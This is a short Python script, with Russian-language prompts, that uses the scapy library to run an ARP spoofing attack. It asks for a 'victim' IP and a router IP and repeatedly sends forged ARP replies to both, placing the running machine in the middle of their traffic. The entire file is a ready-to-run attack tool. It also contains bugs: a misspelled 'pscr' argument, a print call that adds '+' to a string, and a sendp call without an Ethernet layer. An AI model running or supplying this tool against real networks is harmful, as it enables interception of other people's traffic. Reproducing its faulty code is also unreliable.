import time

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0

def restore(destination_ip, source_ip):
    target_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, pscr=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

target_ip = input("Введите ip адрес жертвы:")
gateway_ip = input("Введите ip адрес роутера. По умолчанию (192.168.0.1):")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count +2
        print("\r[+] Отправлено пакетов:", + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("Подождите...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

